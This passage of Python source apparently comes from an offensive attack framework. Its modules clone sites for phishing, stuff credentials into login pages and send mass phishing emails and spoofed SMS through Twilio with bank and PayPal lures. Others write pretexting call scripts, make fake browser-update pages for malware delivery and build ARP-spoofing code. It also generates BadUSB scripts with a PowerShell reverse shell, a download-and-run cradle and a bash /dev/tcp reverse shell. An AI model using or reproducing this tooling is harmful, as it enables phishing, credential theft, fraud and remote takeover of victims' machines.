            f.write(f"{{post_data.decode()}}\\n")
        
        # Redirect
        self.send_response(302)
        self.send_header('Location', '{redirect_url}')
        self.end_headers()

PORT = {port}
with socketserver.TCPServer(("", PORT), CredentialHandler) as httpd:
    print(f"Server running on port {{PORT}}")
    httpd.serve_forever()
"""
        
        print(f"{Fore.CYAN}{server_code}{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}[*] Access at: http://{self.config['lhost']}:{port}{Style.RESET_ALL}")
    
    def run_website_cloner(self):
        """Website cloner for phishing"""
        url = self.module_options.get('url', 'https://facebook.com')
        output_dir = self.module_options.get('output', 'phish_site')
        
        print(f"{Fore.CYAN}[*] Cloning website{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Target: {url}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Output: {output_dir}{Style.RESET_ALL}\n")
        
        try:
            # Create output directory
            os.makedirs(output_dir, exist_ok=True)
            
            # Download page
            print(f"{Fore.BLUE}[*] Downloading page...{Style.RESET_ALL}")
            headers = {'User-Agent': self.config['user_agent']}
            response = requests.get(url, headers=headers, timeout=10, verify=False)
            
            if response.status_code == 200:
                # Save HTML
                html_file = os.path.join(output_dir, 'index.html')
                with open(html_file, 'w', encoding='utf-8') as f:
                    f.write(response.text)
                
                print(f"{Fore.GREEN}[+] Page cloned successfully{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[*] Saved to: {html_file}{Style.RESET_ALL}")
                print(f"\n{Fore.YELLOW}[*] Modify forms to send credentials to your harvester{Style.RESET_ALL}")
                print(f"{Fore.BLUE}[*] Host with: python3 -m http.server 8080 --directory {output_dir}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[!] Failed to download page: {response.status_code}{Style.RESET_ALL}")
        
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
    
    # ============ ADDITIONAL MODULES ============
    
    def run_csrf_scanner(self):
        """CSRF vulnerability scanner"""
        url = self.module_options.get('url', 'http://example.com')
        forms = self.module_options.get('forms', 'all')
        
        print(f"{Fore.CYAN}[*] Scanning for CSRF vulnerabilities{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Target: {url}{Style.RESET_ALL}\n")
        
        try:
            headers = {'User-Agent': self.config['user_agent']}
            response = requests.get(url, headers=headers, timeout=10, verify=False)
            
            if not BS4_AVAILABLE:
                print(f"{Fore.RED}[!] BeautifulSoup not available{Style.RESET_ALL}")
                return
            
            soup = BeautifulSoup(response.text, 'html.parser')
            forms_found = soup.find_all('form')
            
            print(f"{Fore.GREEN}[+] Found {len(forms_found)} forms{Style.RESET_ALL}\n")
            
            vulnerable_forms = []
            
            for idx, form in enumerate(forms_found, 1):
                print(f"{Fore.BLUE}[*] Analyzing form {idx}:{Style.RESET_ALL}")
                
                # Check for CSRF token
                csrf_fields = ['csrf', 'token', '_token', 'csrf_token', 'authenticity_token']
                has_csrf = False
                
                for field in form.find_all('input'):
                    field_name = field.get('name', '').lower()
                    if any(csrf in field_name for csrf in csrf_fields):
                        has_csrf = True
                        break
                
                if not has_csrf:
                    print(f"{Fore.RED}  [!] No CSRF token found - VULNERABLE{Style.RESET_ALL}")
                    vulnerable_forms.append(f"Form {idx}: {form.get('action', 'N/A')}")
                else:
                    print(f"{Fore.GREEN}  [+] CSRF token present{Style.RESET_ALL}")
            
            print(f"\n{Fore.CYAN}[*] CSRF scan completed{Style.RESET_ALL}")
            if vulnerable_forms:
                print(f"{Fore.RED}[+] Found {len(vulnerable_forms)} potentially vulnerable forms{Style.RESET_ALL}")
            else:
                print(f"{Fore.GREEN}[+] No CSRF vulnerabilities found{Style.RESET_ALL}")
        
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
    
    def run_credential_stuffing(self):
        """Credential stuffing attack"""
        target = self.module_options.get('target', 'http://example.com/login')
        creds_file = self.module_options.get('credentials', 'creds.txt')
        threads = int(self.module_options.get('threads', '5'))
        
        print(f"{Fore.CYAN}[*] Starting credential stuffing attack{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Target: {target}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Credentials: {creds_file}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Threads: {threads}{Style.RESET_ALL}\n")
        
        resolved_creds = self.resolve_wordlist_path(creds_file, 'credential')
        if not resolved_creds:
            if not os.path.exists(creds_file):
                print(f"{Fore.RED}[!] Credentials file not found: {creds_file}{Style.RESET_ALL}")
                entry = self.find_wordlist_entry(creds_file, 'credential')
                if entry and not entry['path'].exists():
                    primary_alias = entry['aliases'][0] if entry['aliases'] else entry['name']
                    print(f"{Fore.YELLOW}[*] Tip: run 'download wordlist {primary_alias}' first{Style.RESET_ALL}")
            else:
                resolved_creds = creds_file
            if not resolved_creds:
                return
        
        # Load credentials
        credentials = []
        try:
            with open(resolved_creds, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    if ':' in line:
                        username, password = line.strip().split(':', 1)
                        credentials.append((username, password))
        except Exception as e:
            print(f"{Fore.RED}[!] Error loading credentials: {str(e)}{Style.RESET_ALL}")
            return
        
        print(f"{Fore.GREEN}[+] Loaded {len(credentials)} credential pairs{Style.RESET_ALL}")
        print(f"{Fore.BLUE}[*] Testing credentials...{Style.RESET_ALL}\n")
        
        valid_creds = []
        
        for username, password in credentials[:50]:  # Limit for demo
            print(f"{Fore.BLUE}[*] Trying: {username}:{password[:3]}***{Style.RESET_ALL}")
            
            try:
                data = {'username': username, 'password': password}
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.post(target, data=data, headers=headers, timeout=10, verify=False)
                
                # Check for success indicators
                if 'dashboard' in response.text.lower() or 'welcome' in response.text.lower():
                    print(f"{Fore.GREEN}[+] VALID: {username}:{password}{Style.RESET_ALL}")
                    valid_creds.append((username, password))
                
                time.sleep(0.5)  # Rate limiting
            except Exception as e:
                print(f"{Fore.RED}[-] Error: {str(e)[:50]}{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}[*] Credential stuffing completed{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Valid credentials: {len(valid_creds)}{Style.RESET_ALL}")
    
    # ============ NEW SOCIAL ENGINEERING MODULES ============
    
    def run_mass_mailer(self):
        """Mass email campaign system"""
        template = self.module_options.get('template', 'invoice')
        targets_file = self.module_options.get('targets', 'targets.csv')
        smtp_server = self.module_options.get('smtp_server', 'smtp.gmail.com')
        delay = int(self.module_options.get('delay', '5'))
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║          MASS MAILER CAMPAIGN                    ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}Template: {Fore.WHITE}{template}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}SMTP Server: {Fore.WHITE}{smtp_server}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Delay: {Fore.WHITE}{delay}s between emails{Style.RESET_ALL}\n")
        
        # Email templates
        templates = {
            'invoice': {
                'subject': 'Invoice #{random} - Payment Required',
                'body': '''Dear Customer,\n\nYour invoice #{random} is now available.\nAmount Due: ${amount}\n\nPlease review and process payment within 48 hours.\n\nView Invoice: {link}\n\nBest regards,\nAccounting Department'''
            },
            'shipping': {
                'subject': 'Package Delivery Notification',
                'body': '''Your package is out for delivery.\n\nTracking Number: {tracking}\nExpected Delivery: Today\n\nTrack your package: {link}\n\nThank you,\nShipping Department'''
            },
            'password_reset': {
                'subject': 'Password Reset Request',
                'body': '''We received a request to reset your password.\n\nIf you made this request, click here: {link}\n\nIf you didn't request this, ignore this email.\n\nSecurity Team'''
            },
            'security_alert': {
                'subject': 'Security Alert: Unusual Activity Detected',
                'body': '''We detected unusual activity on your account.\n\nLocation: {location}\nTime: {time}\n\nIf this wasn't you, secure your account: {link}\n\nSecurity Team'''
            }
        }
        
        if template in templates:
            print(f"{Fore.GREEN}✓ Email Template:{Style.RESET_ALL}\n")
            print(f"{Fore.CYAN}Subject: {Fore.WHITE}{templates[template]['subject']}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}Body:{Style.RESET_ALL}\n{Fore.WHITE}{templates[template]['body'][:200]}...{Style.RESET_ALL}\n")
            
            print(f"{Fore.BLUE}ℹ  Variables:{Style.RESET_ALL}")
            print(f"  {Fore.YELLOW}{{link}}{Fore.WHITE} - Phishing URL")
            print(f"  {Fore.YELLOW}{{random}}{Fore.WHITE} - Random number")
            print(f"  {Fore.YELLOW}{{tracking}}{Fore.WHITE} - Tracking number")
            print(f"  {Fore.YELLOW}{{amount}}{Fore.WHITE} - Dollar amount")
            print(f"  {Fore.YELLOW}{{location}}{Fore.WHITE} - IP location")
            print(f"  {Fore.YELLOW}{{time}}{Fore.WHITE} - Current time{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}⚠  Configure SMTP credentials before sending{Style.RESET_ALL}")
        print(f"{Fore.BLUE}ℹ  Target CSV format: email,name,company{Style.RESET_ALL}")
    
    def run_qr_generator(self):
        """Malicious QR code generator"""
        url = self.module_options.get('url', 'http://malicious-site.com')
        output = self.module_options.get('output', 'qr_code.png')
        size = int(self.module_options.get('size', '300'))
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║          QR CODE GENERATOR                       ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}Target URL: {Fore.WHITE}{url}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Output: {Fore.WHITE}{output}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Size: {Fore.WHITE}{size}x{size}px{Style.RESET_ALL}\n")
        
        try:
            # Try to import qrcode library
            import qrcode
            
            qr = qrcode.QRCode(version=1, box_size=10, border=4)
            qr.add_data(url)
            qr.make(fit=True)
            
            img = qr.make_image(fill_color="black", back_color="white")
            img.save(output)
            
            print(f"{Fore.GREEN}✓ QR code generated successfully!{Style.RESET_ALL}")
            print(f"{Fore.CYAN}→ Saved to: {Fore.WHITE}{output}{Style.RESET_ALL}\n")
            
        except ImportError:
            print(f"{Fore.YELLOW}⚠  qrcode library not installed{Style.RESET_ALL}")
            print(f"{Fore.BLUE}ℹ  Install with: {Fore.CYAN}pip install qrcode[pil]{Style.RESET_ALL}\n")
            
            # Generate ASCII QR for demo
            print(f"{Fore.CYAN}ASCII Preview (install qrcode for actual image):{Style.RESET_ALL}\n")
            print(f"  ████████████████  ████  ██████████")
            print(f"  ██          ██  ██    ██        ██")
            print(f"  ██  ██████  ██  ████  ██  ████  ██")
            print(f"  ██  ██████  ██    ██  ██  ████  ██")
            print(f"  ██  ██████  ██  ██    ██  ████  ██")
            print(f"  ██          ██  ██████████      ██")
            print(f"  ████████████████  ██  ██████████\n")
            
        print(f"{Fore.BLUE}ℹ  Use cases:{Style.RESET_ALL}")
        print(f"  • Physical security testing")
        print(f"  • Parking lot drops")
        print(f"  • Fake WiFi posters")
        print(f"  • Fake payment terminals{Style.RESET_ALL}")
    
    def run_usb_payload(self):
        """USB payload generator (BadUSB/Rubber Ducky)"""
        payload_type = self.module_options.get('payload_type', 'reverse_shell')
        target_os = self.module_options.get('target_os', 'windows')
        lhost = self.module_options.get('lhost', self.config['lhost'])
        lport = self.module_options.get('lport', '4444')
        output = self.module_options.get('output', 'payload.txt')
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║          USB PAYLOAD GENERATOR                   ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}Payload Type: {Fore.WHITE}{payload_type}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Target OS: {Fore.WHITE}{target_os}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}LHOST: {Fore.WHITE}{lhost}:{lport}{Style.RESET_ALL}\n")
        
        if target_os == 'windows' and payload_type == 'reverse_shell':
            payload = f"""REM Windows Reverse Shell - Rubber Ducky Script
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
ENTER
STRING $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};
ENTER
STRING while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
ENTER
STRING $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
ENTER
STRING $sendback = (iex $data 2>&1 | Out-String );
ENTER
STRING $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
ENTER
STRING $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
ENTER
STRING $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}
ENTER
STRING $client.Close()
ENTER
"""
        elif target_os == 'windows' and payload_type == 'credentials':
            payload = f"""REM Windows Credential Harvester
DELAY 1000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 500
STRING powershell -WindowStyle Hidden \"IEX (New-Object Net.WebClient).DownloadString('http://{lhost}/harvest.ps1')\"
ENTER
DELAY 2000
STRING exit
ENTER
"""
        elif target_os == 'linux':
            payload = f"""REM Linux Reverse Shell
DELAY 1000
CTRL-ALT t
DELAY 500
STRING bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
ENTER
DELAY 500
STRING exit
ENTER
"""
        else:
            payload = "REM Custom payload - modify as needed\n"
        
        # Save payload
        try:
            with open(output, 'w') as f:
                f.write(payload)
            
            print(f"{Fore.GREEN}✓ Payload generated!{Style.RESET_ALL}")
            print(f"{Fore.CYAN}→ Saved to: {Fore.WHITE}{output}{Style.RESET_ALL}\n")
            print(f"{Fore.BLUE}Preview:{Style.RESET_ALL}\n{Fore.CYAN}{payload[:300]}...{Style.RESET_ALL}\n")
            
        except Exception as e:
            print(f"{Fore.RED}✗ Error saving payload: {str(e)}{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}⚠  Devices:{Style.RESET_ALL}")
        print(f"  • USB Rubber Ducky")
        print(f"  • Bash Bunny")
        print(f"  • Teensy")
        print(f"  • Arduino-based BadUSB")
        print(f"\n{Fore.BLUE}ℹ  Remember to start listener: {Fore.CYAN}use exploit/multi_handler{Style.RESET_ALL}")
    
    def run_fake_update(self):
        """Fake software update page generator"""
        software = self.module_options.get('software', 'chrome')
        payload = self.module_options.get('payload', 'update.exe')
        port = self.module_options.get('port', '8080')
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║          FAKE UPDATE GENERATOR                   ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        templates = {
            'chrome': {
                'title': 'Chrome Update Required',
                'message': 'A new version of Chrome is available',
                'button': 'Update Chrome'
            },
            'firefox': {
                'title': 'Firefox Update Available',
                'message': 'Firefox must be updated to continue',
                'button': 'Update Firefox'
            },
            'flash': {
                'title': 'Flash Player Update',
                'message': 'Flash Player is out of date',
                'button': 'Update Flash Player'
            },
            'windows': {
                'title': 'Windows Security Update',
                'message': 'Critical security update required',
                'button': 'Install Update'
            }
        }
        
        template = templates.get(software, templates['chrome'])
        
        html_content = f"""<!DOCTYPE html>
<html>
<head>
    <title>{template['title']}</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            background: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }}
        .update-box {{
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 400px;
        }}
        .icon {{
            font-size: 64px;
            margin-bottom: 20px;
        }}
        h1 {{
            color: #333;
            font-size: 24px;
            margin-bottom: 10px;
        }}
        p {{
            color: #666;
            margin-bottom: 30px;
        }}
        .update-btn {{
            background: #4285f4;
            color: white;
            border: none;
            padding: 12px 30px;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
        }}
        .update-btn:hover {{
            background: #357ae8;
        }}
    </style>
</head>
<body>
    <div class="update-box">
        <div class="icon">⚠️</div>
        <h1>{template['title']}</h1>
        <p>{template['message']}</p>
        <a href="/{payload}" download>
            <button class="update-btn">{template['button']}</button>
        </a>
    </div>
</body>
</html>"""
        
        output_dir = f"fake_update_{software}"
        os.makedirs(output_dir, exist_ok=True)
        
        with open(f"{output_dir}/index.html", 'w') as f:
            f.write(html_content)
        
        print(f"{Fore.GREEN}✓ Fake update page generated!{Style.RESET_ALL}")
        print(f"{Fore.CYAN}→ Location: {Fore.WHITE}{output_dir}/index.html{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}⚠  Setup:{Style.RESET_ALL}")
        print(f"  1. Place payload: {Fore.CYAN}cp malware.exe {output_dir}/{payload}{Style.RESET_ALL}")
        print(f"  2. Start server: {Fore.CYAN}python3 -m http.server {port} --directory {output_dir}{Style.RESET_ALL}")
        print(f"  3. Access at: {Fore.CYAN}http://{self.config['lhost']}:{port}{Style.RESET_ALL}\n")
        
        print(f"{Fore.BLUE}ℹ  Delivery methods:{Style.RESET_ALL}")
        print(f"  • Watering hole attacks")
        print(f"  • Compromised websites")
        print(f"  • Malicious ads")
        print(f"  • Email campaigns")
    
    def run_sms_spoofing(self):
        """SMS spoofing campaign"""
        message = self.module_options.get('message', 'Your package is ready. Track: {link}')
        sender = self.module_options.get('sender', 'DHL')
        targets_file = self.module_options.get('targets', 'phones.txt')
        twilio_sid = self.module_options.get('twilio_sid', '')
        twilio_token = self.module_options.get('twilio_token', '')
        twilio_number = self.module_options.get('twilio_number', '')
        link = self.module_options.get('link', 'http://track.example.com/123')
        delay = int(self.module_options.get('delay', '2'))
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║          SMS SPOOFING CAMPAIGN                   ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}Sender Display: {Fore.WHITE}{sender}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Message: {Fore.WHITE}{message}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Targets File: {Fore.WHITE}{targets_file}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Delay: {Fore.WHITE}{delay}s between messages{Style.RESET_ALL}\n")
        
        # Replace variables in message
        import random
        final_message = message.replace('{link}', link)
        final_message = final_message.replace('{random}', str(random.randint(100000, 999999)))
        
        # Check if Twilio credentials are provided
        if twilio_sid and twilio_token and twilio_number:
            try:
                # Try to import Twilio
                from twilio.rest import Client
                
                # Load targets
                if not os.path.exists(targets_file):
                    print(f"{Fore.YELLOW}⚠  Target file not found. Creating example file...{Style.RESET_ALL}\n")
                    with open(targets_file, 'w') as f:
                        f.write("+1234567890,John Doe\n")
                        f.write("+0987654321,Jane Smith\n")
                    print(f"{Fore.GREEN}✓ Created example file: {targets_file}{Style.RESET_ALL}")
                    print(f"{Fore.BLUE}ℹ  Edit the file and run again{Style.RESET_ALL}\n")
                    return
                
                # Read targets
                targets = []
                with open(targets_file, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            parts = line.split(',', 1)
                            if len(parts) >= 1:
                                phone = parts[0].strip()
                                name = parts[1].strip() if len(parts) > 1 else 'User'
                                targets.append({'phone': phone, 'name': name})
                
                if not targets:
                    print(f"{Fore.RED}✗ No targets found in {targets_file}{Style.RESET_ALL}\n")
                    return
                
                print(f"{Fore.GREEN}✓ Loaded {len(targets)} target(s){Style.RESET_ALL}\n")
                
                # Initialize Twilio client
                client = Client(twilio_sid, twilio_token)
                
                print(f"{Fore.CYAN}┌─[ SENDING SMS ]───────────────────────────{Style.RESET_ALL}")
                
                success_count = 0
                fail_count = 0
                
                for i, target in enumerate(targets, 1):
                    try:
                        # Personalize message
                        personalized_msg = final_message.replace('{name}', target['name'])
                        
                        # Send SMS
                        message_obj = client.messages.create(
                            body=personalized_msg,
                            from_=twilio_number,
                            to=target['phone']
                        )
                        
                        print(f"{Fore.GREEN}│ [{i}/{len(targets)}] ✓ Sent to {target['phone']} ({target['name']}) - SID: {message_obj.sid[:20]}...{Style.RESET_ALL}")
                        success_count += 1
                        
                        # Delay between messages
                        if i < len(targets):
                            time.sleep(delay)
                        
                    except Exception as e:
                        print(f"{Fore.RED}│ [{i}/{len(targets)}] ✗ Failed to {target['phone']} - Error: {str(e)[:50]}{Style.RESET_ALL}")
                        fail_count += 1
                
                print(f"{Fore.CYAN}└────────────────────────────────────────────{Style.RESET_ALL}\n")
                
                # Summary
                print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
                print(f"{Fore.CYAN}║          CAMPAIGN SUMMARY                        ║{Style.RESET_ALL}")
                print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
                print(f"{Fore.GREEN}✓ Successfully sent: {success_count}{Style.RESET_ALL}")
                print(f"{Fore.RED}✗ Failed: {fail_count}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}Total targets: {len(targets)}{Style.RESET_ALL}\n")
                
            except ImportError:
                print(f"{Fore.YELLOW}⚠  Twilio library not installed{Style.RESET_ALL}")
                print(f"{Fore.BLUE}ℹ  Install with: {Fore.CYAN}pip install twilio{Style.RESET_ALL}\n")
                print(f"{Fore.BLUE}ℹ  Or use alternative methods below{Style.RESET_ALL}\n")
                
        else:
            print(f"{Fore.YELLOW}⚠  Twilio credentials not configured{Style.RESET_ALL}\n")
            print(f"{Fore.BLUE}ℹ  Configure with:{Style.RESET_ALL}")
            print(f"{Fore.CYAN}  set twilio_sid <your_account_sid>")
            print(f"  set twilio_token <your_auth_token>")
            print(f"  set twilio_number <your_twilio_number>{Style.RESET_ALL}\n")
            print(f"{Fore.BLUE}ℹ  Get credentials from: https://www.twilio.com/console{Style.RESET_ALL}\n")
        
        # Show example templates
        print(f"{Fore.GREEN}Example SMS templates:{Style.RESET_ALL}\n")
        
        templates = [
            ("DHL Delivery", "Your package is awaiting delivery. Track: {link}"),
            ("Bank Alert", "Unusual activity on card ending in 4532. Verify: {link}"),
            ("PayPal Security", "Your account has been limited. Restore access: {link}"),
            ("Amazon Order", "Order #{random} delivered. Issues? {link}"),
            ("Netflix Billing", "Payment failed. Update billing: {link}")
        ]
        
        for i, (name, template) in enumerate(templates, 1):
            print(f"{Fore.CYAN}{i}. {name}:{Style.RESET_ALL}")
            print(f"   {Fore.WHITE}{template}{Style.RESET_ALL}\n")
        
        print(f"{Fore.BLUE}ℹ  Alternative implementation methods:{Style.RESET_ALL}")
        print(f"  • Twilio API (recommended - supports sender ID in some countries)")
        print(f"  • Nexmo/Vonage API")
        print(f"  • AWS SNS (limited sender ID support)")
        print(f"  • SMS gateway providers")
        print(f"\n{Fore.BLUE}ℹ  Target file format ({targets_file}):{Style.RESET_ALL}")
        print(f"{Fore.CYAN}  +1234567890,John Doe")
        print(f"  +0987654321,Jane Smith")
        print(f"  +4412345678,Alice Brown{Style.RESET_ALL}")
    
    def run_pretexting(self):
        """Pretexting scenario generator"""
        scenario = self.module_options.get('scenario', 'it_support')
        company = self.module_options.get('company', 'TechCorp')
        urgency = self.module_options.get('urgency', 'high')
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║          PRETEXTING SCENARIO GENERATOR           ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        scenarios = {
            'it_support': {
                'role': 'IT Support Technician',
                'opening': f"Hi, this is Alex from {company} IT Support. We've detected some suspicious activity on your account.",
                'urgency_reason': 'Your account may be compromised. We need to verify your identity immediately.',
                'request': 'Can you verify your employee ID and current password so I can reset it for you?',
                'alternative': 'Could you click this verification link to secure your account?'
            },
            'vendor': {
                'role': 'Vendor/Supplier',
                'opening': f"Good morning, I'm calling from {company}'s main supplier. We need to update our billing information.",
                'urgency_reason': 'Our payment system was updated and we need to confirm your details to avoid service interruption.',
                'request': 'Can you provide the accounts payable contact and their email?',
                'alternative': 'Could you forward this billing update form to your finance department?'
            },
            'executive': {
                'role': 'Executive Assistant',
                'opening': f"Hi, I'm calling on behalf of {company}'s CEO who is traveling.",
                'urgency_reason': 'The CEO needs urgent access to a file for a board meeting happening in 30 minutes.',
                'request': 'Can you email the Q4 financial report to this temporary address?',
                'alternative': 'Could you reset the CEO\'s VPN password and send it to me?'
            },
            'hr': {
                'role': 'HR Representative',
                'opening': f"Hello, this is Sarah from {company} Human Resources.",
                'urgency_reason': 'We need to update employee records before the audit tomorrow.',
                'request': 'Can you verify your social security number and home address?',
                'alternative': 'Please fill out this employee verification form we\'re emailing you.'
            },
            'security': {
                'role': 'Security Officer',
                'opening': f"This is Officer Johnson from {company} Corporate Security.",
                'urgency_reason': 'We detected unauthorized access attempts to your account.',
                'request': 'I need you to change your password right now while I verify your identity.',
                'alternative': 'Click this secure link to update your security settings immediately.'
            }
        }
        
        if scenario in scenarios:
            s = scenarios[scenario]
            print(f"{Fore.YELLOW}Scenario: {Fore.WHITE}{scenario.replace('_', ' ').title()}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Role: {Fore.WHITE}{s['role']}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Company: {Fore.WHITE}{company}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Urgency: {Fore.WHITE}{urgency.upper()}{Style.RESET_ALL}\n")
            
            print(f"{Fore.CYAN}═══ SCRIPT ═══{Style.RESET_ALL}\n")
            print(f"{Fore.GREEN}Opening:{Style.RESET_ALL}")
            print(f"{Fore.WHITE}\"{s['opening']}\"{Style.RESET_ALL}\n")
            
            print(f"{Fore.YELLOW}Urgency Factor:{Style.RESET_ALL}")
            print(f"{Fore.WHITE}\"{s['urgency_reason']}\"{Style.RESET_ALL}\n")
            
            print(f"{Fore.RED}Primary Request:{Style.RESET_ALL}")
            print(f"{Fore.WHITE}\"{s['request']}\"{Style.RESET_ALL}\n")
            
            print(f"{Fore.BLUE}Alternative Approach:{Style.RESET_ALL}")
            print(f"{Fore.WHITE}\"{s['alternative']}\"{Style.RESET_ALL}\n")
            
            print(f"{Fore.CYAN}═══ TIPS ═══{Style.RESET_ALL}\n")
            print(f"  • Use confident, authoritative tone")
            print(f"  • Build rapport before making requests")
            print(f"  • Create time pressure with urgency")
            print(f"  • Use company-specific terminology")
            print(f"  • Have plausible answers for questions")
            print(f"  • Know when to abandon if suspicious\n")
    
    # ============ NETWORK ATTACK MODULES ============
    
    def run_arp_spoof(self):
        """ARP spoofing / Man-in-the-Middle attack"""
        target_ip = self.module_options.get('target_ip', '192.168.1.100')
        gateway_ip = self.module_options.get('gateway_ip', '192.168.1.1')
        interface = self.module_options.get('interface', 'eth0')
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║          ARP SPOOFING ATTACK                     ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}Target: {Fore.WHITE}{target_ip}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Gateway: {Fore.WHITE}{gateway_ip}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Interface: {Fore.WHITE}{interface}{Style.RESET_ALL}\n")
        
        if not SCAPY_AVAILABLE:
            print(f"{Fore.RED}✗ Scapy not available{Style.RESET_ALL}")
            print(f"{Fore.BLUE}ℹ  Install: {Fore.CYAN}pip install scapy{Style.RESET_ALL}\n")
            return
        
        print(f"{Fore.YELLOW}⚠  Prerequisites:{Style.RESET_ALL}")
        print(f"  1. Enable IP forwarding:")
        print(f"     {Fore.CYAN}echo 1 > /proc/sys/net/ipv4/ip_forward{Style.RESET_ALL}")
        print(f"  2. Run as root{Style.RESET_ALL}\n")
        
        print(f"{Fore.BLUE}Python implementation:{Style.RESET_ALL}\n")
        print(f"{Fore.CYAN}from scapy.all import ARP, send")
        print(f"import time")
        print(f"")
        print(f"def arp_spoof(target_ip, gateway_ip):")
        print(f"    target_mac = getmacbyip(target_ip)")
        print(f"    gateway_mac = getmacbyip(gateway_ip)")
        print(f"    ")
        print(f"    # Poison target")
        print(f"    arp_target = ARP(op=2, pdst=target_ip, hwdst=target_mac,")
        print(f"                     psrc=gateway_ip)")
        print(f"    # Poison gateway")
        print(f"    arp_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,")
        print(f"                      psrc=target_ip)")
        print(f"    ")
        print(f"    while True:")
        print(f"        send(arp_target, verbose=False)")
        print(f"        send(arp_gateway, verbose=False)")
        print(f"        time.sleep(2){Style.RESET_ALL}\n")
        
        print(f"{Fore.GREEN}ℹ  Once MITM is active, use:{Style.RESET_ALL}")
        print(f"  • {Fore.CYAN}use network/packet_sniffer{Fore.WHITE} - Capture traffic")
        print(f"  • {Fore.CYAN}use network/ssl_strip{Fore.WHITE} - Downgrade HTTPS")
        print(f"  • {Fore.CYAN}use network/dns_spoof{Fore.WHITE} - Redirect domains{Style.RESET_ALL}")
    
    def run_dns_spoof(self):
        """DNS spoofing attack"""
        domain = self.module_options.get('domain', 'google.com')
